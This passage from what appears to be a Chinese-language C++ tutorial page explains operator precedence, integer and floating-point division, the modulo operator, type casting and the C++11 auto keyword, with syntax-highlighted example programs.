class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">5</span>, b = <span class="number">8</span>, c = <span class="number">3</span>, d = <span class="number">2</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 优先级: * 高于 +</span></span><br><span class="line">    <span class="keyword">int</span> result1 = a + b * c; <span class="comment">// 等价于 a + (b * c) = 5 + (8 * 3) = 5 + 24 = 29</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;a + b * c = &quot;</span> &lt;&lt; result1 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用括号改变顺序</span></span><br><span class="line">    <span class="keyword">int</span> result2 = (a + b) * c; <span class="comment">// (5 + 8) * 3 = 13 * 3 = 39</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;(a + b) * c = &quot;</span> &lt;&lt; result2 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 结合性 (左结合): / 和 * 优先级相同</span></span><br><span class="line">    <span class="keyword">int</span> result3 = b / c * d; <span class="comment">// 等价于 (b / c) * d = (8 / 3) * d = 2 * d = 2 * 2 = 4 (整数除法)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;b / c * d = &quot;</span> &lt;&lt; result3 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// 结合性 (右结合): 赋值</span></span><br><span class="line">    <span class="keyword">int</span> x, y, z;</span><br><span class="line">    x = y = z = <span class="number">10</span>; <span class="comment">// 等价于 x = (y = (z = 10))</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;x=&quot;</span> &lt;&lt; x &lt;&lt; <span class="string">&quot;, y=&quot;</span> &lt;&lt; y &lt;&lt; <span class="string">&quot;, z=&quot;</span> &lt;&lt; z &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 x=10, y=10, z=10</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 结合性 (右结合): 一元负号</span></span><br><span class="line">    <span class="keyword">int</span> val = - - <span class="number">5</span>; <span class="comment">// 等价于 -(-5) = 5</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;- - 5 = &quot;</span> &lt;&lt; val &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>建议:</strong> 当表达式复杂或优先级不明确时，使用括号来明确运算顺序，可以提高代码的可读性并避免错误。</p><h3 id="3-4-2-除法分支"><a href="#3-4-2-除法分支" class="headerlink" title="3.4.2 除法分支"></a>3.4.2 除法分支</h3><p>C++ 的除法运算符 <code>/</code> 的行为取决于其<strong>操作数 (Operand)</strong> 的类型：</p><ol><li> <strong>浮点数除法:</strong> 如果操作数中至少有一个是浮点类型 (<code>float</code>, <code>double</code>, <code>long double</code>)，则执行浮点数除法，结果也是浮点类型，包含小数部分。</li><li> <strong>整数除法:</strong> 如果两个操作数都是整数类型 (<code>int</code>, <code>short</code>, <code>long</code>, <code>char</code>, <code>bool</code> 等)，则执行整数除法。结果只保留商的整数部分，小数部分被**截断 (truncated)**（直接丢弃，不是四舍五入）。</li></ol><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 浮点数除法</span></span><br><span class="line">    <span class="keyword">double</span> result_f1 = <span class="number">9.0</span> / <span class="number">5.0</span>; <span class="comment">// 两个 double</span></span><br><span class="line">    <span class="keyword">double</span> result_f2 = <span class="number">9.0</span> / <span class="number">5</span>;   <span class="comment">// 一个 double, 一个 int (int 被提升为 double)</span></span><br><span class="line">    <span class="keyword">double</span> result_f3 = <span class="number">9</span> / <span class="number">5.0</span>;   <span class="comment">// 一个 int, 一个 double (int 被提升为 double)</span></span><br><span class="line">    <span class="keyword">float</span> result_f4 = <span class="number">9.0f</span> / <span class="number">5.0f</span>; <span class="comment">// 两个 float</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;9.0 / 5.0 = &quot;</span> &lt;&lt; result_f1 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 1.8</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;9.0 / 5   = &quot;</span> &lt;&lt; result_f2 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 1.8</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;9 / 5.0   = &quot;</span> &lt;&lt; result_f3 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 1.8</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;9.0f / 5.0f = &quot;</span> &lt;&lt; result_f4 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 1.8</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 整数除法</span></span><br><span class="line">    <span class="keyword">int</span> result_i1 = <span class="number">9</span> / <span class="number">5</span>;     <span class="comment">// 两个 int</span></span><br><span class="line">    <span class="keyword">int</span> result_i2 = <span class="number">10</span> / <span class="number">3</span>;    <span class="comment">// 两个 int</span></span><br><span class="line">    <span class="keyword">int</span> result_i3 = <span class="number">13</span> / <span class="number">4</span>;    <span class="comment">// 两个 int</span></span><br><span class="line">    <span class="keyword">int</span> result_i4 = <span class="number">-10</span> / <span class="number">3</span>;   <span class="comment">// 负数整数除法 (结果通常向零截断，为 -3)</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;9 / 5     = &quot;</span> &lt;&lt; result_i1 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 1 (小数部分 0.8 被截断)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;10 / 3    = &quot;</span> &lt;&lt; result_i2 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 3 (小数部分 0.333... 被截断)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;13 / 4    = &quot;</span> &lt;&lt; result_i3 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 3 (小数部分 0.25 被截断)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;-10 / 3   = &quot;</span> &lt;&lt; result_i4 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 -3</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 想要得到浮点结果，需要确保至少一个操作数是浮点类型</span></span><br><span class="line">    <span class="comment">// 可以使用类型转换 (见 3.4.4)</span></span><br><span class="line">    <span class="keyword">double</span> result_mixed = <span class="keyword">double</span>(<span class="number">9</span>) / <span class="number">5</span>; <span class="comment">// 将 9 转换为 double</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;double(9) / 5 = &quot;</span> &lt;&lt; result_mixed &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 1.8</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>注意:</strong> 进行除法运算时，务必清楚操作数的类型，以确保得到期望的结果（整数截断或浮点小数）。</p><h3 id="3-4-3-求模运算符"><a href="#3-4-3-求模运算符" class="headerlink" title="3.4.3 求模运算符"></a>3.4.3 求模运算符</h3><p>求模运算符 <code>%</code> 计算整数除法的**余数 (Remainder)**。它要求两个操作数都必须是整数类型（或可以转换为整数的类型，如 <code>char</code>, <code>bool</code>）。</p><p><strong>运算规则:</strong><br><code>a % b</code> 的结果是 <code>a</code> 除以 <code>b</code> 后的余数。其符号通常与被除数 <code>a</code> 的符号相同（C++11 标准规定如此）。</p><p><strong>数学关系:</strong><br>对于整数 <code>a</code> 和 <code>b</code> (其中 <code>b != 0</code>)，以下关系通常成立：<br><code>(a / b) * b + (a % b) == a</code></p><p><strong>用途:</strong></p><ul><li>  判断一个数是否能被另一个数整除（如果 <code>a % b == 0</code>，则 <code>a</code> 能被 <code>b</code> 整除）。</li><li>  获取一个数的最低位数字（<code>num % 10</code>）。</li><li>  将数值限制在一个范围内（例如，生成 0 到 N-1 之间的数：<code>value % N</code>）。</li><li>  周期性操作（例如，每隔 M 个元素执行一次操作：<code>if (count % M == 0)</code>）。</li></ul><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> total_seconds = <span class="number">135</span>;</span><br><span class="line">    <span class="keyword">int</span> seconds_per_minute = <span class="number">60</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> minutes = total_seconds / seconds_per_minute; <span class="comment">// 整数除法得分钟数</span></span><br><span class="line">    <span class="keyword">int</span> remaining_seconds = total_seconds % seconds_per_minute; <span class="comment">// 求模得剩余秒数</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; total_seconds &lt;&lt; <span class="string">&quot; seconds is &quot;</span> </span><br><span class="line">              &lt;&lt; minutes &lt;&lt; <span class="string">&quot; minutes and &quot;</span> </span><br><span class="line">              &lt;&lt; remaining_seconds &lt;&lt; <span class="string">&quot; seconds.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 135 seconds is 2 minutes and 15 seconds.</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 判断奇偶性</span></span><br><span class="line">    <span class="keyword">int</span> number = <span class="number">21</span>;</span><br><span class="line">    <span class="keyword">if</span> (number % <span class="number">2</span> == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; number &lt;&lt; <span class="string">&quot; is even.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; number &lt;&lt; <span class="string">&quot; is odd.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 21 is odd.</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取个位数</span></span><br><span class="line">    <span class="keyword">int</span> value = <span class="number">123</span>;</span><br><span class="line">    <span class="keyword">int</span> last_digit = value % <span class="number">10</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;The last digit of &quot;</span> &lt;&lt; value &lt;&lt; <span class="string">&quot; is &quot;</span> &lt;&lt; last_digit &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 3</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 负数求模 (C++11 及以后，结果符号与被除数一致)</span></span><br><span class="line">    <span class="keyword">int</span> result1 = <span class="number">10</span> % <span class="number">3</span>;   <span class="comment">// 1</span></span><br><span class="line">    <span class="keyword">int</span> result2 = <span class="number">-10</span> % <span class="number">3</span>;  <span class="comment">// -1</span></span><br><span class="line">    <span class="keyword">int</span> result3 = <span class="number">10</span> % <span class="number">-3</span>;  <span class="comment">// 1 </span></span><br><span class="line">    <span class="keyword">int</span> result4 = <span class="number">-10</span> % <span class="number">-3</span>; <span class="comment">// -1</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;10 % 3 = &quot;</span> &lt;&lt; result1 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;-10 % 3 = &quot;</span> &lt;&lt; result2 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;10 % -3 = &quot;</span> &lt;&lt; result3 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;-10 % -3 = &quot;</span> &lt;&lt; result4 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 不能用于浮点数</span></span><br><span class="line">    <span class="comment">// double remainder = 10.5 % 3.2; // 编译错误!</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-4-4-类型转换"><a href="#3-4-4-类型转换" class="headerlink" title="3.4.4 类型转换"></a>3.4.4 类型转换</h3><p>C++允许在不同数据类型之间进行转换，这称为<strong>类型转换 (Type Casting)**。转换可以</strong>隐式 (Implicitly)** 发生（由编译器自动完成），也可以<strong>显式 (Explicitly)</strong> 进行（由程序员通过代码指定）。</p><p><strong>隐式类型转换 (Automatic Conversion):</strong></p><p>在以下情况下，编译器会自动执行类型转换：</p><ol><li><strong>混合类型表达式:</strong> 当一个表达式中包含不同数值类型的操作数时，较小或较低优先级的类型通常会被<strong>提升 (Promoted)</strong> 为较大或较高优先级的类型，然后进行运算。<ul><li>  <strong>整型提升 (Integral Promotion):</strong> 比 <code>int</code> 小的整型（<code>bool</code>, <code>char</code>, <code>signed char</code>, <code>unsigned char</code>, <code>short</code>, <code>unsigned short</code>）在表达式中通常会被提升为 <code>int</code> (如果 <code>int</code> 能容纳其所有值) 或 <code>unsigned int</code>。</li><li>  <strong>算术转换 (Usual Arithmetic Conversions):</strong> 在涉及不同算术类型（整型和浮点型）的运算中，遵循一套规则将操作数转换为共同的类型（通常是两者中“更宽”或精度更高的类型）。例如，<code>int</code> 和 <code>double</code> 运算时，<code>int</code> 会被转换为 <code>double</code>。<code>float</code> 和 <code>double</code> 运算时，<code>float</code> 会被转换为 <code>double</code>。</li></ul></li><li> <strong>赋值:</strong> 将一个类型的值赋给另一种类型的变量时，右侧的值会被转换为左侧变量的类型。这可能导致精度损失（如 <code>double</code> 转 <code>int</code>）或范围问题（如 <code>long</code> 转 <code>short</code>）。</li><li> <strong>函数参数传递:</strong> 将参数传递给函数时，如果实参类型与形参类型不匹配，会尝试进行转换。</li><li> <strong>函数返回值:</strong> 从函数返回一个值时，如果返回值类型与函数声明的返回类型不匹配，会尝试进行转换。</li></ol><p><strong>显式类型转换 (Explicit Casting):</strong></p><p>当需要强制进行类型转换，或者为了使代码意图更清晰时，可以使用显式类型转换。C++提供了多种转换方式：</p><ol><li><p><strong>C 风格强制类型转换 (C-Style Cast):</strong></p> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(typeName) expression</span><br><span class="line">typeName (expression) <span class="comment">// 函数式转换</span></span><br></pre></td></tr></table></figure><p> 这种方式简单直接，但在某些情况下不够安全，因为它可能执行多种不同类型的转换（如 <code>static_cast</code>, <code>const_cast</code>, <code>reinterpret_cast</code> 的组合）。</p></li><li><p><strong>C++ 类型转换运算符 (C++ Cast Operators):</strong> (更推荐，更安全，意图更明确)</p><ul><li>  <code>static_cast&lt;typeName&gt;(expression)</code>: 用于比较“自然”和安全的转换，如数值类型之间的转换（整数与浮点数互转、整数与整数互转）、指针类型之间的相关转换（如 <code>void*</code> 与其他类型指针互转、基类指针与派生类指针互转，但需要谨慎）。这是最常用的 C++ 转换符。</li><li>  <code>dynamic_cast&lt;typeName&gt;(expression)</code>: 主要用于处理类继承层次结构中的指针或引用转换（向下转型），并在运行时进行类型检查。如果转换无效，对于指针会返回 <code>nullptr</code>，对于引用会抛出 <code>std::bad_cast</code> 异常。需要基类是多态的（至少有一个虚函数）。</li><li>  <code>const_cast&lt;typeName&gt;(expression)</code>: 用于添加或移除表达式的 <code>const</code> 或 <code>volatile</code> 限定符。通常用于去除 <code>const</code>，但修改原本是 <code>const</code> 的对象是未定义行为。主要用于处理常量性不匹配的旧 API。</li><li>  <code>reinterpret_cast&lt;typeName&gt;(expression)</code>: 用于低级别的、通常与实现相关的、不安全的转换。例如，在整数和指针之间进行转换，或者在不相关的指针类型之间进行转换。应极力避免使用，除非确实理解其底层含义和风险。</li></ul></li></ol><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 隐式转换示例</span></span><br><span class="line">    <span class="keyword">int</span> i_val = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">double</span> d_val = <span class="number">3.14</span>;</span><br><span class="line">    <span class="keyword">short</span> s_val = <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 混合表达式 (算术转换)</span></span><br><span class="line">    <span class="keyword">double</span> result1 = i_val + d_val; <span class="comment">// i_val (int) 提升为 double (10.0), 结果是 double (13.14)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;int + double = &quot;</span> &lt;&lt; result1 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 整型提升</span></span><br><span class="line">    <span class="keyword">char</span> c_val = <span class="string">&#x27;A&#x27;</span>; <span class="comment">// ASCII 码 65</span></span><br><span class="line">    <span class="keyword">int</span> result2 = c_val + s_val; <span class="comment">// c_val (char) 和 s_val (short) 都提升为 int, 结果是 int (70)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;char + short = &quot;</span> &lt;&lt; result2 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 赋值转换 (可能丢失信息)</span></span><br><span class="line">    <span class="keyword">int</span> i_from_d = d_val; <span class="comment">// d_val (3.14) 转换为 int, 小数部分截断, i_from_d 变为 3</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;int from double = &quot;</span> &lt;&lt; i_from_d &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">short</span> s_from_i = <span class="number">100000</span>; <span class="comment">// 100000 可能超出 short 范围, 结果未定义或回绕</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;short from large int = &quot;</span> &lt;&lt; s_from_i &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// 显式转换示例</span></span><br><span class="line">    <span class="keyword">int</span> total = <span class="number">19</span>;</span><br><span class="line">    <span class="keyword">int</span> count = <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// C 风格转换 (用于浮点除法)</span></span><br><span class="line">    <span class="keyword">double</span> average1 = (<span class="keyword">double</span>)total / count; </span><br><span class="line">    <span class="keyword">double</span> average2 = <span class="keyword">double</span>(total) / count; <span class="comment">// 函数式转换</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;(double)total / count = &quot;</span> &lt;&lt; average1 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 3.8</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;double(total) / count = &quot;</span> &lt;&lt; average2 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 3.8</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// C++ static_cast (推荐用于数值转换)</span></span><br><span class="line">    <span class="keyword">double</span> average3 = <span class="keyword">static_cast</span>&lt;<span class="keyword">double</span>&gt;(total) / count;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;static_cast&lt;double&gt;(total) / count = &quot;</span> &lt;&lt; average3 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 3.8</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> char_code = <span class="keyword">static_cast</span>&lt;<span class="keyword">int</span>&gt;(<span class="string">&#x27;B&#x27;</span>); <span class="comment">// char 转 int</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Code for &#x27;B&#x27;: &quot;</span> &lt;&lt; char_code &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 66</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 演示 reinterpret_cast (通常不推荐)</span></span><br><span class="line">    <span class="keyword">long</span> addr = <span class="number">1000</span>;</span><br><span class="line">    <span class="comment">// int* ptr = reinterpret_cast&lt;int*&gt;(addr); // 将整数视为地址 (危险!)</span></span><br><span class="line">    <span class="comment">// std::cout &lt;&lt; &quot;Pointer from address: &quot; &lt;&lt; ptr &lt;&lt; std::endl;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>建议:</strong></p><ul><li>  尽量避免不必要的类型转换。</li><li>  优先使用 C++ 的 <code>static_cast</code> 进行明确且相对安全的数值或相关指针转换。</li><li>  谨慎使用 C 风格转换，因为它隐藏了转换的类型和风险。</li><li>  仅在绝对必要且理解后果的情况下使用 <code>const_cast</code> 和 <code>reinterpret_cast</code>。</li><li>  注意隐式转换可能导致的精度损失或意外行为，尤其是在混合有符号和无符号整数时。</li></ul><h3 id="3-4-5-C-11中的auto声明"><a href="#3-4-5-C-11中的auto声明" class="headerlink" title="3.4.5 C++11中的auto声明"></a>3.4.5 C++11中的auto声明</h3><p>C++11 引入了 <code>auto</code> 关键字，它允许编译器根据变量的<strong>初始化表达式 (Initializer)</strong> 自动推断出变量的类型。这可以简化代码，尤其是在处理复杂类型（如 STL 迭代器或模板类型）时。</p><p><strong>工作原理:</strong></p><p>当你使用 <code>auto</code> 声明变量时，必须提供一个初始化表达式。编译器会查看这个表达式的类型，并将该类型赋予 <code>auto</code> 声明的变量。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">auto</span> variableName = initializationExpression;</span><br></pre></td></tr></table></figure><p><strong>要点:</strong></p><ul><li>  <strong>必须初始化:</strong> 使用 <code>auto</code> 声明的变量必须在声明时初始化。</li><li>  <strong>类型推断:</strong> 类型是从初始化表达式推断出来的，而不是变量本身的某种默认类型。</li><li><strong><code>const</code> 和引用:</strong> <code>auto</code> 通常不会自动推断出顶层的 <code>const</code> 或引用。如果需要 <code>const</code> 或引用，需要显式添加。<ul><li>  <code>auto x = value;</code> // x 的类型与 value 相同 (const/引用被剥离)</li><li>  <code>const auto cx = value;</code> // cx 是 const 类型</li><li>  <code>auto&amp; rx = value;</code> // rx 是引用类型</li><li>  <code>const auto&amp; crx = value;</code> // crx 是 const 引用类型</li></ul></li><li><strong>列表初始化:</strong> 对于 C++11 中的列表初始化 <code>&#123;&#125;</code>，<code>auto</code> 的推断规则比较特殊。<ul><li>  <code>auto x = &#123;1, 2, 3&#125;;</code> // C++11/14: x 被推断为 std::initializer_list<int></li><li>  <code>auto y = &#123;1&#125;;</code> // C++11/14: y 被推断为 std::initializer_list<int></li><li>  <code>auto z&#123;1&#125;;</code> // C++17: z 被推断为 int (注意没有等号)</li></ul></li></ul><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span 